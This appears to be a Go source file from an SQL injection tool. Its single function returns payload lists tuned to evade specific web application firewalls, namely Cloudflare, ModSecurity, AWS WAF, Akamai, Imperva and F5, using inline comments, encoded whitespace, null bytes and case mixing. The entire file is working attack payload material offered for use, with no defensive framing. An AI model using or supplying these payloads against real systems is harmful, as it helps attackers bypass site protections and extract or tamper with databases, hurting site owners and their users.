package sqliengine

// ============================================================
//  WAF BYPASS PAYLOADS FOR SQL INJECTION
// ============================================================

// GetWAFBypassPayloads returns SQLi payloads specifically designed to bypass a detected WAF.
func GetWAFBypassPayloads(wafType string) []string {
	switch wafType {
	case "Cloudflare":
		return []string{
			// Cloudflare SQLi bypasses
			"'/*!50000OR*/'1'='1",
			"'%0bOR%0b'1'='1",
			"' OR/**/'1'='1",
			"'%09OR%09'1'='1",
			"'+OR+'1'='1",
			"'/**/union/**/select/**/null--",
			"-1'/*!50000UNION*//*!50000SELECT*/1,2,3--",
		}
	case "ModSecurity":
		return []string{
			// ModSecurity CRS bypasses
			"'/*!50000OR*/'1'='1",
			"'%0aOR%0a'1'='1",
			"'%0dOR%0d'1'='1",
			"' /*!OR*/ '1'='1",
			"'||'1'='1",
			"1'/*!50000UNION*//*!50000SELECT*/1,2,3--",
			"' union%0a%09select%0a%091,2,3--",
			"' AnD 1=1--",
		}
	case "AWS WAF", "AWS CloudFront":
		return []string{
			// AWS WAF bypasses
			"' OR '1'='1'%00",
			"'%20OR%20'1'='1",
			"' oR '1'='1'--",
			"'/**/OR/**/1=1--",
			"'+oR+'1'='1",
			"-1' UnIoN SeLeCt 1,2,3--",
		}
	case "Akamai":
		return []string{
			// Akamai bypasses
			"' %4fR '1'='1",
			"'%09oR%09'1'='1",
			"' /*!OR*/ '1'='1",
			"1'%0a%0dUNION%0a%0dSELECT%0a%0d1,2,3--",
			"'%00OR%00'1'='1",
		}
	case "Imperva (Incapsula)":
		return []string{
			// Imperva bypasses
			"'/**/OR/**/1=1--",
			"' /*!50000OR*/ '1'='1",
			"1'%0bUNION%0bSELECT%0b1,2,3--",
			"'||1=1--",
			"' %6fR '1'='1",
		}
	case "F5 BIG-IP ASM":
		return []string{
			"'/**/OR/**/1=1--",
			"'%09OR%09'1'='1",
			"1' /*!UNION*/ /*!SELECT*/ 1,2,3--",
		}
	default:
		return []string{
			// Generic WAF bypass
			"'/**/OR/**/1=1--",
			"'%09OR%09'1'='1",
			"' /*!OR*/ '1'='1",
			"'%0aOR%0a'1'='1",
			"' oR '1'='1",
			"-1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
		}
	}
}
